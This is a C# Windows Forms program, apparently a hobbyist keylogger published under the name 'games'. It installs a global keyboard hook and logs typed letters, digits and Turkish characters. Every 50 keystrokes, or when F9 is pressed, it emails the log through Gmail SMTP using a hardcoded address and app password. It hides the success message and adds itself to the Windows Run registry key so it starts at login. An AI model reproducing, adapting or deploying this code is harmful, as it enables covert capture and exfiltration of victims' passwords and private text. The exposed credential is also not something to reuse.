
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using HootKeys;
using Microsoft.VisualBasic;

namespace games
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            TuslariDinle();
        }

        /*
         * YouTube ==>  Pisqo Channel C#,PHP,JAVA  <== YouTube
         * 
         * D�nyan�n sonu, b�yle her anlat�lan� �aka zannedip
         * alk��layan insanlar�n y�kselen alk�l�ar� aras�nda gelicek.
         * 
         *#NurullaG��
         *@nurullah_guc instagram,twitter
         ==>  Pisqo Channel C#,PHP,JAVA  <== 
          */



        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        const int KEYEVENTF_EXTENDEDKEY = 0x1;
        const int KEYEVENTF_KEYUP = 0x2;

		[DllImport("user32.dll")]
		static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		[DllImport("user32.dll")]
		static extern bool GetKeyboardState(byte[] lpKeyState);

		[DllImport("user32.dll")]
		static extern IntPtr GetKeyboardLayout(uint idThread);

		[DllImport("user32.dll")]
		static extern uint MapVirtualKey(uint uCode, uint uMapType);

		private static string? TranslateKeyToText(Keys key, bool isShiftPressed, bool isCapsLockOn)
		{
			// Control keys should not be translated
			if (key < Keys.Space || key == Keys.Delete)
				return null;

			var keyState = new byte[256];
			if (!GetKeyboardState(keyState))
				return null;

			if (isShiftPressed)
			{
				keyState[0x10] = 0x80; // VK_SHIFT
			}
			if (isCapsLockOn)
			{
				keyState[0x14] = 0x01; // VK_CAPITAL toggle bit
			}

			uint virtualKey = (uint)key;
			uint scanCode = MapVirtualKey(virtualKey, 0);
			var sb = new System.Text.StringBuilder(8);
			IntPtr layout = GetKeyboardLayout(0);
			int result = ToUnicodeEx(virtualKey, scanCode, keyState, sb, sb.Capacity, 0, layout);

			if (result == 1)
			{
				return sb.ToString();
			}
			if (result > 1)
			{
				// Some keys may produce surrogate pairs; take full string
				return sb.ToString();
			}
			if (result < 0)
			{
				// Dead key: call again to clear state
				ToUnicodeEx(virtualKey, scanCode, keyState, sb, sb.Capacity, 0, layout);
			}
			return null;
		}


        globalKeyboardHook klavye = new globalKeyboardHook();
        int number = 0;
        string log = "Bo� - ";
        bool BigChar = true;

        void TuslariDinle()
        {

            klavye.HookedKeys.Add(Keys.A);
            klavye.HookedKeys.Add(Keys.S);
            klavye.HookedKeys.Add(Keys.D);
            klavye.HookedKeys.Add(Keys.F);
            klavye.HookedKeys.Add(Keys.G);
            klavye.HookedKeys.Add(Keys.H);
            klavye.HookedKeys.Add(Keys.J);
            klavye.HookedKeys.Add(Keys.K);
            klavye.HookedKeys.Add(Keys.L);
            klavye.HookedKeys.Add(Keys.Z);
            klavye.HookedKeys.Add(Keys.X);
            klavye.HookedKeys.Add(Keys.C);
            klavye.HookedKeys.Add(Keys.V);
            klavye.HookedKeys.Add(Keys.B);
            klavye.HookedKeys.Add(Keys.N);
            klavye.HookedKeys.Add(Keys.M);
            klavye.HookedKeys.Add(Keys.Q);
            klavye.HookedKeys.Add(Keys.W);
            klavye.HookedKeys.Add(Keys.E);
            klavye.HookedKeys.Add(Keys.R);
            klavye.HookedKeys.Add(Keys.T);
            klavye.HookedKeys.Add(Keys.Y);
            klavye.HookedKeys.Add(Keys.U);
            klavye.HookedKeys.Add(Keys.I);
            klavye.HookedKeys.Add(Keys.O);
            klavye.HookedKeys.Add(Keys.P);

            //T�rk�e Karekterler 

            klavye.HookedKeys.Add(Keys.OemOpenBrackets);
            klavye.HookedKeys.Add(Keys.Oem6);
            klavye.HookedKeys.Add(Keys.Oem1);
            klavye.HookedKeys.Add(Keys.Oem7);
            klavye.HookedKeys.Add(Keys.OemQuestion);
            klavye.HookedKeys.Add(Keys.Oem5);

            //Rakamlar

            klavye.HookedKeys.Add(Keys.NumPad0);
            klavye.HookedKeys.Add(Keys.NumPad1);
            klavye.HookedKeys.Add(Keys.NumPad2);
            klavye.HookedKeys.Add(Keys.NumPad3);
            klavye.HookedKeys.Add(Keys.NumPad4);
            klavye.HookedKeys.Add(Keys.NumPad5);
            klavye.HookedKeys.Add(Keys.NumPad6);
            klavye.HookedKeys.Add(Keys.NumPad7);
            klavye.HookedKeys.Add(Keys.NumPad8);
            klavye.HookedKeys.Add(Keys.NumPad9);

            //�st Rakamlar

            klavye.HookedKeys.Add(Keys.D0);
            klavye.HookedKeys.Add(Keys.D1);
            klavye.HookedKeys.Add(Keys.D2);
            klavye.HookedKeys.Add(Keys.D3);
            klavye.HookedKeys.Add(Keys.D4);
            klavye.HookedKeys.Add(Keys.D5);
            klavye.HookedKeys.Add(Keys.D6);
            klavye.HookedKeys.Add(Keys.D7);
            klavye.HookedKeys.Add(Keys.D8);
            klavye.HookedKeys.Add(Keys.D9);

            //nokta , backspace vs
            klavye.HookedKeys.Add(Keys.OemPeriod);
            klavye.HookedKeys.Add(Keys.Back);


            klavye.HookedKeys.Add(Keys.Space);
            klavye.HookedKeys.Add(Keys.Enter);
            klavye.HookedKeys.Add(Keys.CapsLock);
			klavye.HookedKeys.Add(Keys.F9); // Manuel test gönderimi


            klavye.KeyDown += new KeyEventHandler(TusKombinasyonu);
        }


		void Mail()
		{

			MailMessage msj = new MailMessage();
			SmtpClient istemci = new SmtpClient();

			// İleti içeriği ve kodlamaları
			msj.From = new MailAddress("cdeniz.sahinn@gmail.com");
			msj.To.Add("cdeniz.sahinn@gmail.com");
			msj.Subject = "#Log";
			msj.Body = log.ToString();
			msj.IsBodyHtml = false;
			msj.BodyEncoding = Encoding.UTF8;
			msj.SubjectEncoding = Encoding.UTF8;

			// Gmail SMTP: 587 STARTTLS
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			istemci.Host = "smtp.gmail.com";
			istemci.Port = 587;
			istemci.EnableSsl = true; // STARTTLS
			istemci.UseDefaultCredentials = false;
			var smtpUser = "cdeniz.sahinn@gmail.com";
			var smtpPass = "JxGFxSPQSXLGIyHV"; // Gmail uygulama şifresi
			istemci.Credentials = new System.Net.NetworkCredential(smtpUser, smtpPass);
			istemci.DeliveryMethod = SmtpDeliveryMethod.Network;
			istemci.Timeout = 15000;

			try
			{
				istemci.Send(msj);
				// MessageBox.Show("Gönderildi (Gmail 587/TLS)"); // success notification hidden
			}
			catch (Exception ex)
			{
				MessageBox.Show("Gönderim Hatası (Gmail): " + ex.Message + "\n" + ex.ToString(), "SMTP Hatası");
			}


		}

        void TusKombinasyonu(object sender, KeyEventArgs e)
        {

			if (number > 50)
            {
                Mail();
                number = 0;
				log = "Bo� - ";
            }
			if (e.KeyCode == Keys.F9)
			{
				Mail();
				return;
			}

			// Special keys first
			if (e.KeyCode == Keys.Enter)
			{
				log += " -enter- ";
				number++;
				return;
			}
			if (e.KeyCode == Keys.Space)
			{
				log += " ";
				number++;
				return;
			}
			if (e.KeyCode == Keys.Back)
			{
				log += "*Back*";
				number++;
				return;
			}
			if (e.KeyCode == Keys.CapsLock)
			{
				if (BigChar == true)
					BigChar = false;
				else
					BigChar = true;
				return;
			}

			// Use OS layout to translate key to character (fixes Turkish letters and case)
			bool isShiftPressed = e.Shift;
			bool isCapsOn = Control.IsKeyLocked(Keys.CapsLock);
			var text = TranslateKeyToText(e.KeyCode, isShiftPressed, isCapsOn);
			if (!string.IsNullOrEmpty(text))
			{
				log += text;
				number++;
				return;
			}

            // Fallback legacy mappings (kept for non-text keys)
            //nokta , backspace vs
            if (e.KeyCode == Keys.OemPeriod)
            {

                log += ".";
                number++;
            }
            if (e.KeyCode == Keys.Back)
            {

                log += "*Back*";
                number++;
            }

            //Rakamlar
            if (e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.D0)
            {

                log += "0";
                number++;
            }
            if (e.KeyCode == Keys.NumPad1 || e.KeyCode == Keys.D1)
            {

                log += "1";
                number++;
            }
            if (e.KeyCode == Keys.NumPad2 || e.KeyCode == Keys.D2)
            {

                log += "2";
                number++;
            }
            if (e.KeyCode == Keys.NumPad3 || e.KeyCode == Keys.D3)
            {

                log += "3";
                number++;
            }
            if (e.KeyCode == Keys.NumPad4 || e.KeyCode == Keys.D4)
            {

                log += "4";
                number++;
            }
            if (e.KeyCode == Keys.NumPad5 || e.KeyCode == Keys.D5)
            {

                log += "5";
                number++;
            }
            if (e.KeyCode == Keys.NumPad6 || e.KeyCode == Keys.D6)
            {

                log += "6";
                number++;
            }
            if (e.KeyCode == Keys.NumPad7 || e.KeyCode == Keys.D7)
            {

                log += "7";
                number++;
            }
            if (e.KeyCode == Keys.NumPad8 || e.KeyCode == Keys.D8)
            {

                log += "8";
                number++;
            }
            if (e.KeyCode == Keys.NumPad9 || e.KeyCode == Keys.D9)
            {

                log += "9";
                number++;
            }



            //T�rk�e Karekterler

            if (e.KeyCode == Keys.OemOpenBrackets)
            {
                if (BigChar == true)
                    log += "�";
                else
                    log += "�";

                number++;
            }
            if (e.KeyCode == Keys.Oem6)
            {
                if (BigChar == true)
                    log += "�";
                else
                    log += "�";

                number++;
            }
            if (e.KeyCode == Keys.Oem1)
            {
                if (BigChar == true)
                    log += "�";
                else
                    log += "�";

                number++;
            }

            if (e.KeyCode == Keys.Oem7)
            {
                if (BigChar == true)
                    log += "�";
                else
                    log += "i";

                number++;
            }
            if (e.KeyCode == Keys.OemQuestion)
            {
                if (BigChar == true)
                    log += "�";
                else
                    log += "�";

                number++;
            }
            if (e.KeyCode == Keys.Oem5)
            {
                if (BigChar == true)
                    log += "�";
                else
                    log += "�";

                number++;
            }


            //ENTER BACKSPACE VS

            //Dier Karekterler


            if (e.KeyCode == Keys.A)
            {
                if (BigChar == true)
                    log += "A";
                else
                    log += "a";

                number++;
            }
            if (e.KeyCode == Keys.S)
            {
                if (BigChar == true)
                    log += "S";
                else
                    log += "s";

                number++;
            }
            if (e.KeyCode == Keys.D)
            {
                if (BigChar == true)
                    log += "D";
                else
                    log += "d";

                number++;
            }
            if (e.KeyCode == Keys.F)
            {

                if (BigChar == true)
                    log += "F";
                else
                    log += "f";

                number++;
            }
            if (e.KeyCode == Keys.G)
            {

                if (BigChar == true)
                    log += "G";
                else
                    log += "g";

                number++;
            }
            if (e.KeyCode == Keys.H)
            {

                if (BigChar == true)
                    log += "H";
                else
                    log += "h";

                number++;
            }
            if (e.KeyCode == Keys.J)
            {

                if (BigChar == true)
                    log += "J";
                else
                    log += "j";

                number++;
            }
            if (e.KeyCode == Keys.K)
            {

                if (BigChar == true)
                    log += "K";
                else
                    log += "k";

                number++;

            }
            if (e.KeyCode == Keys.L)
            {

                if (BigChar == true)
                    log += "L";
                else
                    log += "l";

                number++;
            }
            if (e.KeyCode == Keys.Z)
            {

                if (BigChar == true)
                    log += "Z";
                else
                    log += "z";

                number++;
            }
            if (e.KeyCode == Keys.X)
            {

                if (BigChar == true)
                    log += "X";
                else
                    log += "x";

                number++;
            }
            if (e.KeyCode == Keys.C)
            {

                if (BigChar == true)
                    log += "C";
                else
                    log += "c";

                number++;
            }
            if (e.KeyCode == Keys.V)
            {

                if (BigChar == true)
                    log += "V";
                else
                    log += "v";

                number++;
            }
            if (e.KeyCode == Keys.B)
            {

                if (BigChar == true)
                    log += "B";
                else
                    log += "b";

                number++;
            }
            if (e.KeyCode == Keys.N)
            {

                if (BigChar == true)
                    log += "N";
                else
                    log += "n";

                number++;
            }
            if (e.KeyCode == Keys.M)
            {

                if (BigChar == true)
                    log += "M";
                else
                    log += "m";

                number++;

            }
            if (e.KeyCode == Keys.Q)
            {

                if (BigChar == true)
                    log += "Q";
                else
                    log += "q";

                number++;
            }
            if (e.KeyCode == Keys.W)
            {

                if (BigChar == true)
                    log += "W";
                else
                    log += "w";

                number++;
            }
            if (e.KeyCode == Keys.E)
            {

                if (BigChar == true)
                    log += "E";
                else
                    log += "e";

                number++;
            }
            if (e.KeyCode == Keys.R)
            {

                if (BigChar == true)
                    log += "R";
                else
                    log += "r";

                number++;
            }
            if (e.KeyCode == Keys.T)
            {

                if (BigChar == true)
                    log += "T";
                else
                    log += "t";

                number++;
            }
            if (e.KeyCode == Keys.Y)
            {

                if (BigChar == true)
                    log += "Y";
                else
                    log += "y";

                number++;
            }
            if (e.KeyCode == Keys.U)
            {

                if (BigChar == true)
                    log += "U";
                else
                    log += "u";

                number++;
            }
            if (e.KeyCode == Keys.I)
            {

                if (BigChar == true)
                    log += "I";
                else
                    log += "�";

                number++;
            }
            if (e.KeyCode == Keys.O)
            {

                if (BigChar == true)
                    log += "O";
                else
                    log += "o";

                number++;
            }
            if (e.KeyCode == Keys.P)
            {

                if (BigChar == true)
                    log += "P";
                else
                    log += "p";

                number++;
            }
        }

        private void Form1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Control.IsKeyLocked(Keys.CapsLock))
            {
                BigChar = true;
            }
            else
            {
                BigChar = false;
            }



            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("games", "\"" + Application.ExecutablePath + "\"");
        }


    }
}